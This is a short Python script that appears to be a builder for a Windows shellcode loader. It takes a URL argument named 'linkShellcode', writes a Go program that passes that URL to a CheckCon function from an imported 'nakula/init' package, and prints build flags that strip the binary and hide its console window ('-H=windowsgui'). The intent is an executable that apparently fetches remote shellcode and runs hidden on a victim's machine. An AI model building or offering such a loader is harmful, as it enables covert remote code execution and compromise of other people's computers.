import sys
import os 

def WriteFile(code):
    text_file = open("src/apps.go", "w")
    n = text_file.write(code)
    text_file.close()

def CreateFile(url):
    isPayload = "package main\n"
    isPayload += "import (\n"
    isPayload += '\tinitial "nakula/init"\n'
    isPayload += ")\n"
    isPayload += "func main(){\n"
    isPayload += '\tinitial.CheckCon("%s")\n' %(url)
    isPayload += "}"
    return isPayload

def Build():
    print ("[+] go src folder")
    print ('[+] build : GOOS=windows  GOARCH=386 go build -ldflags "-s -w -H=windowsgui" -o yourname.exe')

def main():
    linkShellcode = sys.argv[1]
    isCode = CreateFile(linkShellcode)
    WriteFile(isCode)
    Build()


if __name__ == "__main__":
    main()